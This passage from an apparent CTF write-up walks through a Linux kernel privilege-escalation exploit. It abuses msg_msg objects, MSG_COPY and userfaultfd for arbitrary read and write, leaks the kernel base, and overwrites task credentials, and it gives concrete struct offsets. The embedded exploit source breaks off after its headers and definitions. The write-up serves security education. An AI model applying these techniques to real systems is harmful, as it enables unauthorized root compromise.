</div><div><br></div><div>Basically, it traverses the linked list structure of the msg_msg object, and uses usercopy to bring the desired message back to userspace. Then, do_msgrcv calls <a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L169">free_msg</a>, which frees the linked list structure in order (starting from head, then next, etc.).<br><br>Now, let us think about abusing a UAF over these elastic objects for arb read and arb write. By modifying the next pointer or the size, arb read via msg_msg should be quite trivial, except for the fact that unlinking it from the queue (unless you can somehow skip modifying the first few qwords which you can't in this challenge) would destroy it. You can try to modify size so maybe it can leak more data from the next segment of the msg_msg object, but hardened usercopy would stop you dead in your tracks. However, this is where MSG_COPY comes into play. Not only does it not unlink your message, but it also uses memcpy for the initial copying of data! So now, we can happily modify the next pointer and change the m_ts field. This technique has already been documented in Popov's CVE writeup. The only restriction is that your next segment has to start with a null qword to avoid kernel panics or having it go somewhere you do not want it to go to.<br><br>How would we approach arb write then? This is where every Linux kernel exploit developer's good friend userfaultfd comes back (rip to the new unprivileged userfaultfd settings from 5.11 and forwards). During the msgsnd process, if you manage to have a UAF over the first part of the msg_msg object, you can have it copy over data for a message request that requires more than just one allocation. Then, if you abuse userfaultfd to hang the copy right before it pulls the value of the next pointer (such as when it's a few bytes away from copying everything into the first chunk), you can use the UAF to change this next pointer, and you can achieve arbitrary write once you release the hang! Of course, just like arb read, this requires the target region to start with a null qword. To make this clearer, take a look at the following diagram:</div><div><br></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-izQijq0j-lI/YSfvHKSIK2I/AAAAAAAACH8/mBElL4uaDmYslUsEgGbwc7gDdAJzpjNtQCLcBGAsYHQ/s1085/1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="694" data-original-width="1085" height="409" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/1.png" width="640"></a></div><br><div>Now with an understanding of both primitives, what will the exploitation path be from where we left off? Well, as I discussed in my <a href="https://www.willsroot.io/2021/02/dicectf-2021-hashbrown-writeup-from.html">hashbrown writeup</a> from diceCTF, to get a kernel base leak with FG-KASLR on, we need to rely on pointers into kernel data as those are not affected. It's as simple as just spraying a ton of shm_file_data objects in kmalloc-32 (which has pointers to kernel data such as in the init_ipc_ns field), and allocate a msg_msg such that it will take up a 4k slab and a kmalloc-32 slab as its next segment that is under our UAF's control. Then we can expand the size (without causing it to traverse more than once), and use MSG_COPY to get a OOB read in the kmalloc 32 slabs and achieve leaks. Of course, before we do that, we have to make sure our data sent via the ioctl follows the format (ip, netmask, etc.), but that is trivial to implement.&nbsp;</div><div><br></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-XzR1Uw1zDT4/YSfwFUxd8RI/AAAAAAAACIE/FxGT0dVNwRIYEJ2YIakaN6kjqXTEv7H2ACLcBGAsYHQ/s1083/2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="707" data-original-width="1083" height="418" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/2.png" width="640"></a></div><br><div>Then, we can re-abuse this arb read to read the task_struct linked list starting from init_task. Since our exploit is probably the latest process running on a generally idle qemu system, we can just walk from prev and hit our task_struct pretty quickly. While a normal trick to find offsets in task_struct is to use prctl SET_NAME to set the comm member (as ptr-yudai detailed in his <a href="https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308" target="_blank">Google CTF Quals 2021 Fullchain writeup</a>), we provided vmlinux with debugging symbols and structs. The task doubly linked list is located at an offset of 0x298, with a consistently null qword beforehand, the pid is at offset 0x398 (which is close enough for this region to be treated as a single msg segment), while the real_cred and cred pointers are at offset 0x538 and 0x540, also luckily with a nice null qword beforehand.&nbsp;</div><div><br></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-Y-YqvmgaX1U/YSggQhwb5pI/AAAAAAAACIc/leKw-FMmY_8TuX-rqv_H0Get2kT3NFEEACLcBGAsYHQ/s1121/3.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="745" data-original-width="1121" height="426" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/3.png" width="640"></a></div><div class="separator" style="clear: both; text-align: center;"><br></div><div>Once we find the current process based on the pid in task structs, we can just arb write to the real_cred and cred pointer, replacing them with init_cred and effectively pwning the system.</div><div><br></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-MhE76o_slr0/YSfwYpL-e-I/AAAAAAAACIQ/-ThXZ-1XlH4-hQJzKbxsJazF73c8g_SWQCLcBGAsYHQ/s1121/4.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="704" data-original-width="1121" height="402" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/4.png" width="640"></a></div><br><div>Here is my exploit for reference:</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(8).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-fire_exploit-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="fire_exploit.c">
        <tbody><tr>
          <td id="file-fire_exploit-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-fire_exploit-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">_GNU_SOURCE</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-fire_exploit-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-fire_exploit-c-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-fire_exploit-c-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>unistd.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-fire_exploit-c-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-fire_exploit-c-LC6" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-fire_exploit-c-LC7" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>fcntl.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-fire_exploit-c-LC8" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sched.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-fire_exploit-c-LC9" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>pthread.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-fire_exploit-c-LC10" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>byteswap.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-fire_exploit-c-LC11" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>poll.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-fire_exploit-c-LC12" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>assert.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-fire_exploit-c-LC13" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>time.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-fire_exploit-c-LC14" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>signal.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-fire_exploit-c-LC15" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/wait.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-fire_exploit-c-LC16" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/syscall.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-fire_exploit-c-LC17" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/mman.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-fire_exploit-c-LC18" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/timerfd.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-fire_exploit-c-LC19" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/ipc.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-fire_exploit-c-LC20" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/msg.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-fire_exploit-c-LC21" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/socket.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-fire_exploit-c-LC22" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/reboot.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-fire_exploit-c-LC23" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/userfaultfd.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-fire_exploit-c-LC24" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>arpa/inet.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-fire_exploit-c-LC25" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/shm.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-fire_exploit-c-LC26" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-fire_exploit-c-LC27" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_API</span> <span class="pl-c1">0xc018aa3f</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-fire_exploit-c-LC28" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_REGISTER</span> <span class="pl-c1">0xc020aa00</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-fire_exploit-c-LC29" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_UNREGISTER</span> <span class="pl-c1">0x8010aa01</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-fire_exploit-c-LC30" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_COPY</span> <span class="pl-c1">0xc028aa03</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-fire_exploit-c-LC31" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_ZEROPAGE</span> <span class="pl-c1">0xc020aa04</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-fire_exploit-c-LC32" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_WAKE</span> <span class="pl-c1">0x8010aa02</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-fire_exploit-c-LC33" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-fire_exploit-c-LC34" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">ADD_RULE</span> <span class="pl-c1">0x1337babe</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-fire_exploit-c-LC35" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DELETE_RULE</span> <span class="pl-c1">0xdeadbabe</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L36" class="blob-num js-line-number js-code-nav-line-number" data-line-number="36"></td>
          <td id="file-fire_exploit-c-LC36" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">EDIT_RULE</span> <span class="pl-c1">0x1337beef</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L37" class="blob-num js-line-number js-code-nav-line-number" data-line-number="37"></td>
          <td id="file-fire_exploit-c-LC37" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SHOW_RULE</span> <span class="pl-c1">0xdeadbeef</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L38" class="blob-num js-line-number js-code-nav-line-number" data-line-number="38"></td>
          <td id="file-fire_exploit-c-LC38" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DUP_RULE</span> <span class="pl-c1">0xbaad5aad</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L39" class="blob-num js-line-number js-code-nav-line-number" data-line-number="39"></td>
          <td id="file-fire_exploit-c-LC39" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L40" class="blob-num js-line-number js-code-nav-line-number" data-line-number="40"></td>
          <td id="file-fire_exploit-c-LC40" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> </td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L41" class="blob-num js-line-number js-code-nav-line-number" data-line-number="41"></td>
          <td id="file-fire_exploit-c-LC41" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L42" class="blob-num js-line-number js-code-nav-line-number" data-line-number="42"></td>
          <td id="file-fire_exploit-c-LC42" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">long</span> mtype;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L43" class="blob-num js-line-number js-code-nav-line-number" data-line-number="43"></td>
          <td id="file-fire_exploit-c-LC43" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> mtext[<span class="pl-c1">1</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L44" class="blob-num js-line-number js-code-nav-line-number" data-line-number="44"></td>
          <td id="file-fire_exploit-c-LC44" class="blob-code blob-code-inner js-file-line">}msg;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L45" class="blob-num js-line-number js-code-nav-line-number" data-line-number="45"></td>
          <td id="file-fire_exploit-c-LC45" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L46" class="blob-num js-line-number js-code-nav-line-number" data-line-number="46"></td>
          <td id="file-fire_exploit-c-LC46" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> </td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L47" class="blob-num js-line-number js-code-nav-line-number" data-line-number="47"></td>
          <td id="file-fire_exploit-c-LC47" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L48" class="blob-num js-line-number js-code-nav-line-number" data-line-number="48"></td>
          <td id="file-fire_exploit-c-LC48" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *ll_next;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L49" class="blob-num js-line-number js-code-nav-line-number" data-line-number="49"></td>
          <td id="file-fire_exploit-c-LC49" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *ll_prev;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L50" class="blob-num js-line-number js-code-nav-line-number" data-line-number="50"></td>
          <td id="file-fire_exploit-c-LC50" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">long</span> m_type;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L51" class="blob-num js-line-number js-code-nav-line-number" data-line-number="51"></td>
          <td id="file-fire_exploit-c-LC51" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> m_ts;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L52" class="blob-num js-line-number js-code-nav-line-number" data-line-number="52"></td>
          <td id="file-fire_exploit-c-LC52" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *next;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L53" class="blob-num js-line-number js-code-nav-line-number" data-line-number="53"></td>
          <td id="file-fire_exploit-c-LC53" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *security;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L54" class="blob-num js-line-number js-code-nav-line-number" data-line-number="54"></td>
          <td id="file-fire_exploit-c-LC54" class="blob-code blob-code-inner js-file-line">}msg_header;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L55" class="blob-num js-line-number js-code-nav-line-number" data-line-number="55"></td>
          <td id="file-fire_exploit-c-LC55" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L56" class="blob-num js-line-number js-code-nav-line-number" data-line-number="56"></td>
          <td id="file-fire_exploit-c-LC56" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">INBOUND</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L57" class="blob-num js-line-number js-code-nav-line-number" data-line-number="57"></td>
          <td id="file-fire_exploit-c-LC57" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OUTBOUND</span> <span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L58" class="blob-num js-line-number js-code-nav-line-number" data-line-number="58"></td>
          <td id="file-fire_exploit-c-LC58" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DESC_MAX</span> <span class="pl-c1">0x800</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L59" class="blob-num js-line-number js-code-nav-line-number" data-line-number="59"></td>
          <td id="file-fire_exploit-c-LC59" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L60" class="blob-num js-line-number js-code-nav-line-number" data-line-number="60"></td>
          <td id="file-fire_exploit-c-LC60" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L61" class="blob-num js-line-number js-code-nav-line-number" data-line-number="61"></td>
          <td id="file-fire_exploit-c-LC61" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L62" class="blob-num js-line-number js-code-nav-line-number" data-line-number="62"></td>
          <td id="file-fire_exploit-c-LC62" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> iface[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L63" class="blob-num js-line-number js-code-nav-line-number" data-line-number="63"></td>
          <td id="file-fire_exploit-c-LC63" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> name[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L64" class="blob-num js-line-number js-code-nav-line-number" data-line-number="64"></td>
          <td id="file-fire_exploit-c-LC64" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> ip[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L65" class="blob-num js-line-number js-code-nav-line-number" data-line-number="65"></td>
          <td id="file-fire_exploit-c-LC65" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> netmask[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L66" class="blob-num js-line-number js-code-nav-line-number" data-line-number="66"></td>
          <td id="file-fire_exploit-c-LC66" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> idx;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L67" class="blob-num js-line-number js-code-nav-line-number" data-line-number="67"></td>
          <td id="file-fire_exploit-c-LC67" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> type;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L68" class="blob-num js-line-number js-code-nav-line-number" data-line-number="68"></td>
          <td id="file-fire_exploit-c-LC68" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> proto;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L69" class="blob-num js-line-number js-code-nav-line-number" data-line-number="69"></td>
          <td id="file-fire_exploit-c-LC69" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> port;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L70" class="blob-num js-line-number js-code-nav-line-number" data-line-number="70"></td>
          <td id="file-fire_exploit-c-LC70" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> action;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L71" class="blob-num js-line-number js-code-nav-line-number" data-line-number="71"></td>
          <td id="file-fire_exploit-c-LC71" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> desc[DESC_MAX];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L72" class="blob-num js-line-number js-code-nav-line-number" data-line-number="72"></td>
          <td id="file-fire_exploit-c-LC72" class="blob-code blob-code-inner js-file-line">} <span class="pl-c1">user_rule_t</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L73" class="blob-num js-line-number js-code-nav-line-number" data-line-number="73"></td>
          <td id="file-fire_exploit-c-LC73" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L74" class="blob-num js-line-number js-code-nav-line-number" data-line-number="74"></td>
          <td id="file-fire_exploit-c-LC74" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> fd;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L75" class="blob-num js-line-number js-code-nav-line-number" data-line-number="75"></td>
          <td id="file-fire_exploit-c-LC75" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> target_idx;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L76" class="blob-num js-line-number js-code-nav-line-number" data-line-number="76"></td>
          <td id="file-fire_exploit-c-LC76" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint64_t</span> target_addr;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L77" class="blob-num js-line-number js-code-nav-line-number" data-line-number="77"></td>
          <td id="file-fire_exploit-c-LC77" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> target_size;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L78" class="blob-num js-line-number js-code-nav-line-number" data-line-number="78"></td>
          <td id="file-fire_exploit-c-LC78" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint64_t</span> race_page;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L79" class="blob-num js-line-number js-code-nav-line-number" data-line-number="79"></td>
          <td id="file-fire_exploit-c-LC79" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">pthread_t</span> thread;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L80" class="blob-num js-line-number js-code-nav-line-number" data-line-number="80"></td>
          <td id="file-fire_exploit-c-LC80" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L81" class="blob-num js-line-number js-code-nav-line-number" data-line-number="81"></td>
          <td id="file-fire_exploit-c-LC81" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint64_t</span> init_ipc_ns, kbase, init_task, init_cred;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L82" class="blob-num js-line-number js-code-nav-line-number" data-line-number="82"></td>
          <td id="file-fire_exploit-c-LC82" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L83" class="blob-num js-line-number js-code-nav-line-number" data-line-number="83"></td>
